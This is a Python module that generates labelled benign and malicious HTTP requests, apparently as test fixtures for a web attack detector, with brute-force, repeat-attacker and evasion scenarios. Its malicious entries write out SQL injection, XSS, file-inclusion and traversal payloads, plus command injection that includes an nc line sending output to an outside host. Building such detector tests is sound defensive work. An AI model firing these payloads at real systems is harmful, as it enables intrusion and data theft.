from datetime import datetime, timezone

BASE_TS = datetime(2026, 10, 31, 10, 0, 0, tzinfo=timezone.utc).timestamp()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}


def _req(rid, label, category, ip, method, path, query="", body="", headers=None,
         ts=0.0, note=""):
    h = dict(UA)
    if headers:
        h.update(headers)
    if body:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    return {"id": rid, "label": label, "category": category, "ip": ip,
            "method": method, "path": path, "query": query, "body": body,
            "headers": h, "ts": BASE_TS + ts, "note": note}


def benign():
    b = "198.51.100."
    return [
        _req("B01", "benign", "normal", b + "1", "GET", "/index.html", ts=1),
        _req("B02", "benign", "normal", b + "2", "GET", "/products", "id=42&sort=price", ts=3),
        _req("B03", "benign", "normal", b + "3", "GET", "/search", "q=blue+running+shoes", ts=5),
        _req("B04", "benign", "normal", b + "4", "POST", "/login", body="username=alice&password=Secret123", ts=7),
        _req("B05", "benign", "normal", b + "5", "GET", "/blog", "title=rock+and+roll+history", ts=9),
        _req("B06", "benign", "normal", b + "6", "GET", "/search", "q=select+a+seat+for+the+show", ts=11),
        _req("B07", "benign", "normal", b + "7", "POST", "/comment", body="text=I+love+this+article%21+Thanks", ts=13),
        _req("B08", "benign", "normal", b + "8", "GET", "/api/users/15", ts=15),
        _req("B09", "benign", "normal", b + "9", "GET", "/about", ts=17),
        _req("B10", "benign", "normal", b + "10", "GET", "/search", "q=O%27Brien+bakery", ts=19),
        _req("B11", "benign", "normal", b + "11", "GET", "/docs", "file=readme.txt", ts=21),
        _req("B12", "benign", "normal", b + "12", "POST", "/feedback", body="message=Union+members+will+vote+next+week", ts=23),
        _req("B13", "benign", "normal", b + "13", "GET", "/search", "q=trade+union+select+committee+elections", ts=25,
             note="legitimate text that contains the words 'union select'"),
        _req("B14", "benign", "normal", b + "14", "POST", "/comment", body="text=I+use+the+%3Cscript%3E+tag+in+my+HTML+lessons", ts=27,
             note="legitimate text that mentions a script tag"),
    ]


def malicious():
    a = "203.0.113."
    n = [0]

    def m(rid, cat, method, path, query="", body="", headers=None, note=""):
        n[0] += 1
        return _req(rid, "malicious", cat, a + str(n[0]), method, path, query, body, headers,
                    ts=30 + n[0] * 2, note=note)

    return [
        # SQL injection
        m("M01", "sqli", "GET", "/products", "id=1' OR '1'='1"),
        m("M02", "sqli", "GET", "/products", "id=1 UNION SELECT username,password FROM users--"),
        m("M03", "sqli", "POST", "/login", body="username=admin'--&password=x"),
        m("M04", "sqli", "GET", "/products", "id=1;DROP TABLE users"),
        m("M05", "sqli", "GET", "/products", "id=1%20AND%20SLEEP(5)"),
        m("M06", "sqli", "GET", "/products", "id=1%2527%2520OR%2520%25271%2527%253D%25271", note="double URL-encoded"),
        m("M07", "sqli", "GET", "/search", "q=1 UNION/**/SELECT/**/null,null", note="inline comments instead of spaces"),
        # Cross-site scripting
        m("M08", "xss", "GET", "/search", "q=<script>alert(1)</script>"),
        m("M09", "xss", "POST", "/comment", body="text=<img src=x onerror=alert(1)>"),
        m("M10", "xss", "GET", "/redirect", "url=javascript:alert(document.cookie)"),
        m("M11", "xss", "GET", "/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", note="URL-encoded"),
        m("M12", "xss", "GET", "/index.html", headers={"Referer": "<script>alert(1)</script>"}, note="payload in a header"),
        # Local file inclusion
        m("M13", "lfi", "GET", "/view", "page=/etc/passwd"),
        m("M14", "lfi", "GET", "/view", "page=php://filter/convert.base64-encode/resource=index.php"),
        m("M15", "lfi", "GET", "/download", "file=....//....//etc/passwd", note="nested traversal"),
        # Directory traversal
        m("M16", "traversal", "GET", "/download", "file=../../../../windows/win.ini"),
        m("M17", "traversal", "GET", "/static/..%2f..%2fetc%2fshadow", note="encoded slashes in the path"),
        m("M18", "traversal", "GET", "/files", "name=..\\..\\boot.ini"),
        # Command injection
        m("M19", "cmdi", "GET", "/ping", "host=8.8.8.8;cat /etc/passwd"),
        m("M20", "cmdi", "GET", "/ping", "host=8.8.8.8 && whoami"),
        m("M21", "cmdi", "GET", "/ping", "host=$(id)"),
        m("M22", "cmdi", "POST", "/tools", body="cmd=ls | nc 203.0.113.9 4444"),
        # Automated scanner
        m("M23", "scanner", "GET", "/index.html", headers={"User-Agent": "sqlmap/1.7"}, note="scanner user agent only"),
        m("M24", "scanner", "GET", "/admin", headers={"User-Agent": "Nikto/2.5"}, note="scanner user agent only"),
        # Evasion: payloads that avoid the signatures (expected false negatives)
        m("M25", "xss", "GET", "/search", "q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
          note="base64 of a script tag"),
        m("M26", "sqli", "GET", "/products", "id=1 AND ASCII(SUBSTRING(@@version,1,1))>50",
          note="blind SQL injection with no tautology"),
    ]


def brute_force():
    """25 login attempts in 5 seconds from one IP. The first 10 are within the limit."""
    ip = "203.0.113.250"
    out = []
    for i in range(25):
        label = "benign" if i < 10 else "malicious"
        cat = "normal" if i < 10 else "bruteforce"
        out.append(_req(f"BF{i + 1:02d}", label, cat, ip, "POST", "/login",
                        body=f"username=admin&password=guess{i + 1}", ts=120 + i * 0.2,
                        note="brute-force login attempt"))
    return out


def repeat_attacker():
    """One IP sends five different attacks in a row; it is banned after the third."""
    ip = "203.0.113.99"
    payloads = [
        ("sqli", "GET", "/products", "id=1' OR '1'='1", ""),
        ("xss", "GET", "/search", "q=<script>alert(1)</script>", ""),
        ("lfi", "GET", "/view", "page=/etc/passwd", ""),
        ("cmdi", "GET", "/ping", "host=1.1.1.1;whoami", ""),
        ("traversal", "GET", "/download", "file=../../secret.txt", ""),
    ]
    out = []
    for i, (cat, method, path, query, body) in enumerate(payloads):
        out.append(_req(f"RA{i + 1:02d}", "malicious", cat, ip, method, path, query, body,
                        ts=150 + i, note="repeat attacker"))
    return out


def all_requests():
    reqs = benign() + malicious() + brute_force() + repeat_attacker()
    return sorted(reqs, key=lambda r: r["ts"])
